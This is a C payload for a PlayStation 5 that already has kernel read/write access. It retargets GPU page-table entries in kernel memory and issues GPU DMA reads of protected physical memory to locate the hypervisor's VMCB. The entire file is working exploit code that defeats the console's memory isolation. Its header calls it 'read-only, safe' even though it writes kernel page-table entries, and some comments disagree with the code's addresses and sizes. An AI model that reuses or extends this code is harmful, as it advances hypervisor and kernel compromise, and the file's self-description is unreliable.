/* probe90/diff2.elf — locate the VMCB inside the NDA region 0x60800000+ by temporal diff.
 * The VMCB's ciphertext changes on every VMEXIT (event-injection/n_rip fields); the NPT and
 * free memory are static. Read each 2MB chunk twice (~200ms apart) via the /dev/gc DMA
 * (bit50 = system-coherent, NO bit47), diff at 4KB granularity, log the changing pages.
 * Read-only, safe. Log: /data/kex_diff2.txt
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <ps5/kernel.h>
#include <ps5/payload.h>

extern const intptr_t KERNEL_ADDRESS_DMAP_BASE;

#define PROT_GPU_READ   0x10
#define PROT_GPU_WRITE  0x20
#define MAP_NO_COALESCE 0x00400000u
#define DMEM_TYPE_GARLIC 0xb
#define DMEM_RANGE_END   0x400000000ull

#define GPU_PDE_VALID   0x1ull
#define GPU_PDE_IS_PTE  (1ull << 54)
#define GPU_PDE_TF      (1ull << 56)
#define GPU_PDE_BIT50   (1ull << 50)
#define GPU_ADDR_MASK   0x0000FFFFFFFFFFC0ull
#define GPU_ADDR_8K_MASK 0x0000FFFFFFFFE000ull
#define GPU_ADDR_2M_MASK 0x0000FFFFFFE00000ull

#define GVMSPACE_SIZE        0x100
#define GVMSPACE_PAGE_DIR_VA 0x38
#define DATA_BASE_GVMSPACE   0x2EEA570u

#define GPU_SUBMIT_IOCTL    0xC0108102u
#define PM4_TYPE3           3u
#define PM4_OPCODE_DMA_DATA 0x50u
#define PM4_SHADER_COMPUTE  1u

#define CPU_PG_V     0x001ull
#define CPU_PG_PS    0x080ull
#define CPU_PG_FRAME 0x000FFFFFFFFFF000ull
#define RAM_MAX      0x400000000ull

#define OFFSET_KERNEL_PMAP_STORE 0x28c84a8ull

#define SEG_BASE     0x60600000ull
#define NCHUNK       64              /* 64 x 8KB = 512KB sweep of the VMCB band */
#define CHUNK        0x200000ull

static int      g_logfd = -1;
static uint64_t g_dmap;

static void logline(const char *m) {
  if (g_logfd >= 0) { write(g_logfd, m, strlen(m)); write(g_logfd, "\n", 1); fsync(g_logfd); }
  printf("%s\n", m);
}

typedef int (*fn_alloc_dmem)(off_t, off_t, size_t, size_t, int, off_t *);
typedef int (*fn_map_dmem)(void **, size_t, int, int, off_t, size_t);
typedef int (*fn_release_dmem)(off_t, size_t);
static fn_alloc_dmem   p_AllocateDirectMemory;
static fn_map_dmem     p_MapDirectMemory;
static fn_release_dmem p_ReleaseDirectMemory;

static int resolve_syms(void) {
  p_AllocateDirectMemory = (fn_alloc_dmem) dlsym(RTLD_DEFAULT, "sceKernelAllocateDirectMemory");
  p_MapDirectMemory      = (fn_map_dmem)   dlsym(RTLD_DEFAULT, "sceKernelMapDirectMemory");
  p_ReleaseDirectMemory  = (fn_release_dmem) dlsym(RTLD_DEFAULT, "sceKernelReleaseDirectMemory");
  if (!p_AllocateDirectMemory || !p_MapDirectMemory || !p_ReleaseDirectMemory) return -1;
  return 0;
}

static int read_phys(uint64_t pa, uint64_t *out) {
  if (pa >= RAM_MAX) return -1;
  return kernel_copyout((intptr_t)(g_dmap + pa), out, 8) == 0;
}

static uint64_t cpu_va_to_pa(uint64_t pml4_pa, uint64_t va) {
  uint64_t e;
  uint64_t i4=(va>>39)&0x1FF, i3=(va>>30)&0x1FF, i2=(va>>21)&0x1FF, i1=(va>>12)&0x1FF;
  if (pml4_pa >= RAM_MAX) return 0;
  if (!read_phys(pml4_pa+i4*8, &e) || !(e&CPU_PG_V)) return 0;
  uint64_t pdpt_pa = e&CPU_PG_FRAME;
  if (!read_phys(pdpt_pa+i3*8, &e) || !(e&CPU_PG_V)) return 0;
  if (e&CPU_PG_PS) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFFULL);
  uint64_t pd_pa = e&CPU_PG_FRAME;
  if (!read_phys(pd_pa+i2*8, &e) || !(e&CPU_PG_V)) return 0;
  if (e&CPU_PG_PS) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFFULL);
  uint64_t pt_pa = e&CPU_PG_FRAME;
  if (!read_phys(pt_pa+i1*8, &e) || !(e&CPU_PG_V)) return 0;
  return (e&CPU_PG_FRAME)|(va&0xFFFULL);
}

typedef struct { uint64_t gva, phys, pte_pa, raw; int is_2m; } leaf_t;
#define MAX_LEAVES 65536
static leaf_t leaves[MAX_LEAVES];
static int     nleaves = 0;

static void add_leaf(uint64_t gva, uint64_t phys, uint64_t pte_pa, uint64_t raw, int is_2m) {
  if (nleaves < MAX_LEAVES) {
    leaves[nleaves].gva=gva; leaves[nleaves].phys=phys; leaves[nleaves].pte_pa=pte_pa;
    leaves[nleaves].raw=raw; leaves[nleaves].is_2m=is_2m;
  }
  nleaves++;
}

static void walk_vmid(intptr_t gvmspace_base, int vmid) {
  uint64_t page_dir_va = kernel_getlong(gvmspace_base + (intptr_t)vmid * GVMSPACE_SIZE + GVMSPACE_PAGE_DIR_VA);
  if (!page_dir_va) return;
  for (int i4 = 0; i4 < 512; i4++) {
    uint64_t pml4e;
    if (kernel_copyout((intptr_t)(page_dir_va + i4 * 8), &pml4e, 8) != 0 || !(pml4e & GPU_PDE_VALID)) continue;
    uint64_t pdpt_pa = pml4e & GPU_ADDR_MASK;
    for (int i3 = 0; i3 < 512; i3++) {
      uint64_t pdpe;
      if (!read_phys(pdpt_pa + i3 * 8, &pdpe) || !(pdpe & GPU_PDE_VALID)) continue;
      uint64_t pd_pa = pdpe & GPU_ADDR_MASK;
      for (int i2 = 0; i2 < 512; i2++) {
        uint64_t pde;
        if (!read_phys(pd_pa + i2 * 8, &pde) || !(pde & GPU_PDE_VALID)) continue;
        uint64_t gva2 = ((uint64_t)i4 << 39) | ((uint64_t)i3 << 30) | ((uint64_t)i2 << 21);
        if (pde & GPU_PDE_IS_PTE) {
          add_leaf(gva2, pde & GPU_ADDR_MASK, pd_pa + i2 * 8, pde, 1);
        } else {
          uint64_t frag = (pde >> 59) & 0x1F;
          uint64_t ptb_pa = pde & GPU_ADDR_MASK;
          for (int i1 = 0; i1 < 256; i1++) {
            uint64_t pte;
            if (!read_phys(ptb_pa + i1 * 8, &pte) || !(pte & GPU_PDE_VALID)) continue;
            if ((pte & GPU_PDE_TF) && frag == 4) {
              uint64_t subtab = pte & GPU_ADDR_MASK;
              for (int i1b = 0; i1b < 8; i1b++) {
                uint64_t leaf;
                if (!read_phys(subtab + i1b * 8, &leaf) || !(leaf & GPU_PDE_VALID)) continue;
                add_leaf(gva2 | ((uint64_t)i1 << 16) | ((uint64_t)i1b << 13),
                         leaf & GPU_ADDR_8K_MASK, subtab + i1b * 8, leaf, 0);
              }
            } else {
              uint64_t shift = (frag == 1) ? 13 : 16;
              add_leaf(gva2 | ((uint64_t)i1 << shift), pte & GPU_ADDR_MASK, ptb_pa + i1 * 8, pte, 0);
            }
          }
        }
      }
    }
  }
}

static void build_dma_data(uint32_t *pkt, uint64_t src_va, uint64_t dst_va, uint32_t len_bytes) {
  pkt[0] = ((PM4_TYPE3 & 3u) << 30) | ((5u & 0x3FFFu) << 16)
         | ((PM4_OPCODE_DMA_DATA & 0xFFu) << 8) | ((PM4_SHADER_COMPUTE & 1u) << 1);
  pkt[1] = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);
  pkt[2] = (uint32_t)(src_va & 0xFFFFFFFFull);
  pkt[3] = (uint32_t)(src_va >> 32);
  pkt[4] = (uint32_t)(dst_va & 0xFFFFFFFFull);
  pkt[5] = (uint32_t)(dst_va >> 32);
  pkt[6] = len_bytes & 0x1FFFFFu;
}

static void build_desc(uint64_t *d, uint64_t cmd_gpu_va, uint32_t dword_count) {
  d[0] = ((cmd_gpu_va & 0xFFFFFFFFull) << 32) | 0xC0023F00ull;
  d[1] = (((uint64_t)(dword_count & 0xFFFFFu)) << 32) | ((cmd_gpu_va >> 32) & 0xFFFFull);
}

struct gc_submit { uint32_t pipe_id; uint32_t count; uint64_t cmd_buf_ptr; };

static int submit_read(int gc, uint8_t *cmd_va, uint64_t cmd_gva,
                       uint64_t src_gva, uint64_t dst_gva, uint32_t len) {
  memset(cmd_va, 0, 0x100 + 0x10);
  build_dma_data((uint32_t*)cmd_va, src_gva, dst_gva, len);
  build_desc((uint64_t*)(cmd_va + 0x100), cmd_gva, 7);
  struct gc_submit sub = { 0, 1, (uint64_t)(uintptr_t)(cmd_va + 0x100) };
  int r = ioctl(gc, GPU_SUBMIT_IOCTL, &sub);
  usleep(300 * 1000);
  return r;
}

int main(void) {
  g_logfd = open("/data/kex_diff2.txt", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0666);
  g_dmap  = (uint64_t)(uintptr_t)KERNEL_ADDRESS_DMAP_BASE;
  char b[400];

  intptr_t kb = payload_get_args()->kdata_base_addr;
  snprintf(b, sizeof b, "diff2: kdata=0x%llx fw=0x%x", (unsigned long long)kb, kernel_get_fw_version());
  logline(b);

  if (resolve_syms() != 0) { logline("FAIL: resolve syms"); return 1; }
  int gc = open("/dev/gc", O_RDWR);
  if (gc < 0) gc = open("/dev/gc0", O_RDWR);
  if (gc < 0) { logline("FAIL: cannot open /dev/gc"); return 1; }

  const size_t SZ = 0x10000;   /* 64KB garlic -> 8KB leaves (system-RAM-capable w/ bit50) */
  int prot = PROT_READ | PROT_WRITE | PROT_GPU_READ | PROT_GPU_WRITE;

  enum { NBUF = NCHUNK + 2, STAGING_IDX = NCHUNK, CMD_IDX = NCHUNK + 1 };
  void *gva[NBUF]; off_t goff[NBUF];
  memset(gva, 0, sizeof gva);
  for (int i = 0; i < NBUF; i++) {
    if (p_AllocateDirectMemory(0, DMEM_RANGE_END, SZ, SZ, DMEM_TYPE_GARLIC, &goff[i]) != 0 ||
        p_MapDirectMemory(&gva[i], SZ, prot, MAP_NO_COALESCE, goff[i], SZ) != 0) {
      snprintf(b, sizeof b, "FAIL: garlic alloc/map at idx %d", i); logline(b); return 1;
    }
  }
  uint64_t staging_gva = (uint64_t)(uintptr_t)gva[STAGING_IDX];
  uint64_t cmd_gva     = (uint64_t)(uintptr_t)gva[CMD_IDX];
  snprintf(b, sizeof b, "buffers: %d victims, staging=0x%llx cmd=0x%llx",
           NCHUNK, (unsigned long long)staging_gva, (unsigned long long)cmd_gva);
  logline(b);

  intptr_t gvmspace_base = (intptr_t)kb + (intptr_t)DATA_BASE_GVMSPACE;

  /* kernel CR3 walk (anchor) */
  uint64_t kp_kva = (uint64_t)kb + OFFSET_KERNEL_PMAP_STORE;
  uint64_t kernel_cr3      = kernel_getlong((intptr_t)(kp_kva + 0x28)) & ~0xFFFull;
  uint64_t kernel_pml4_kva = kernel_getlong((intptr_t)(kp_kva + 0x20));
  if (!kernel_cr3 || (kernel_pml4_kva - g_dmap) != kernel_cr3) { logline("ABORT: kernel_pmap invariant"); return 1; }
  uint64_t anchor_pa = cpu_va_to_pa(kernel_cr3, (uint64_t)kb + 0x40);
  uint64_t anchor_kva = 0, anchor_dmap = 0;
  kernel_copyout((intptr_t)((uint64_t)kb + 0x40), &anchor_kva, 8);
  read_phys(anchor_pa, &anchor_dmap);
  if (!anchor_pa || anchor_kva == 0 || anchor_dmap != anchor_kva) { logline("ABORT: CR3 walk failed"); return 1; }
  logline("anchor PASS");

  /* find dev vmid */
  int dev_vmid = -1;
  for (int vm = 0; vm < 16 && dev_vmid < 0; vm++) {
    nleaves = 0; memset(leaves, 0, sizeof leaves);
    walk_vmid(gvmspace_base, vm);
    int n = nleaves < MAX_LEAVES ? nleaves : MAX_LEAVES;
    for (int i = 0; i < n; i++) if (leaves[i].gva == (uint64_t)(uintptr_t)gva[0]) { dev_vmid = vm; break; }
  }
  snprintf(b, sizeof b, "dev vmid=%d", dev_vmid); logline(b);
  if (dev_vmid < 0) { logline("FAIL: no dev vmid"); return 1; }

  nleaves = 0; memset(leaves, 0, sizeof leaves);
  walk_vmid(gvmspace_base, dev_vmid);
  int n = nleaves < MAX_LEAVES ? nleaves : MAX_LEAVES;

  leaf_t vleaf[NCHUNK];
  memset(vleaf, 0, sizeof vleaf);
  int n_2m = 0, n_8k = 0;
  for (int i = 0; i < n; i++) { if (leaves[i].is_2m) n_2m++; else n_8k++; }
  snprintf(b, sizeof b, "leaf sizes: 2MB=%d 8KB=%d (total %d)", n_2m, n_8k, n);
  logline(b);
  /* prefer 8KB leaves (system-RAM-capable with bit50); fall back to 2MB (VRAM-only) */
  for (int pass = 0; pass < 2; pass++) {
    int want_8k = (pass == 0);
    for (int i = 0; i < n; i++) {
      if ((leaves[i].is_2m) == want_8k) continue;   /* 2MB leaves: skip on 8KB pass; 8KB leaves: skip on 2MB pass */
      for (int k = 0; k < NCHUNK; k++) {
        if (vleaf[k].raw) continue;
        if (leaves[i].gva == (uint64_t)(uintptr_t)gva[k]) { vleaf[k] = leaves[i]; break; }
      }
    }
    if (vleaf[0].raw) break;
  }
  for (int k = 0; k < NCHUNK; k++) {
    snprintf(b, sizeof b, "victim[%d]: gva=0x%llx phys=0x%llx raw=0x%016llx",
             k, (unsigned long long)vleaf[k].gva, (unsigned long long)vleaf[k].phys,
             (unsigned long long)vleaf[k].raw);
    logline(b);
    if (!vleaf[k].raw) { logline("FAIL: missing victim leaf"); return 1; }
  }

  uint8_t *snapA = malloc(CHUNK);
  if (!snapA) { logline("FAIL: malloc"); return 1; }

  for (int k = 0; k < NCHUNK; k++) {
    leaf_t *v = &vleaf[k];
    uint32_t csz  = v->is_2m ? 0x200000u : 0x2000u;
    uint64_t mask = v->is_2m ? GPU_ADDR_2M_MASK : GPU_ADDR_8K_MASK;
    uint64_t base = SEG_BASE + (uint64_t)k * csz;
    uint64_t old  = v->raw;
    uint64_t nw   = (old & ~mask) | (base & mask) | GPU_PDE_BIT50;
    snprintf(b, sizeof b, "chunk %d base=0x%llx is_2m=%d retarget=0x%016llx", k, (unsigned long long)base, v->is_2m, (unsigned long long)nw);
    logline(b);

    kernel_setlong((intptr_t)(g_dmap + v->pte_pa), nw);

    /* snapshot A */
    memset(gva[STAGING_IDX], 0xA5, csz);
    int r0 = submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, v->gva, staging_gva, csz);
    memcpy(snapA, gva[STAGING_IDX], csz);
    {
      uint64_t hist[256] = {0};
      int still_fill = 1;
      for (uint32_t i = 0; i < csz; i++) { hist[snapA[i]]++; if (snapA[i] != 0xA5) still_fill = 0; }
      int distinct = 0; for (int i = 0; i < 256; i++) if (hist[i]) distinct++;
      snprintf(b, sizeof b, "chunk %d snapshotA: still_fill=%d distinct=%d/256", k, still_fill, distinct);
      logline(b);
    }

    usleep(200000);   /* VMEXITs rewrite the VMCB dynamic fields */

    /* snapshot B */
    memset(gva[STAGING_IDX], 0xA5, csz);
    int r1 = submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, v->gva, staging_gva, csz);

    kernel_setlong((intptr_t)(g_dmap + v->pte_pa), old);

    uint8_t *B = (uint8_t*)gva[STAGING_IDX];
    int changed_pages = 0;
    for (uint32_t o = 0; o < csz; o += 0x1000) {
      if (memcmp(snapA + o, B + o, 0x1000) != 0) {
        changed_pages++;
        uint64_t addr = base + o;
        if (changed_pages <= 40) {
          snprintf(b, sizeof b, "  CHANGED 0x%llx", (unsigned long long)addr);
          logline(b);
        }
      }
    }
    snprintf(b, sizeof b, "chunk %d: ioctl=%d,%d changed_pages=%d/%d",
             k, r0, r1, changed_pages, (int)(csz / 0x1000));
    logline(b);
  }

  free(snapA);
  close(gc);
  logline("done");
  for (int i = 0; i < NBUF; i++) p_ReleaseDirectMemory(goff[i], SZ);
  return 0;
}
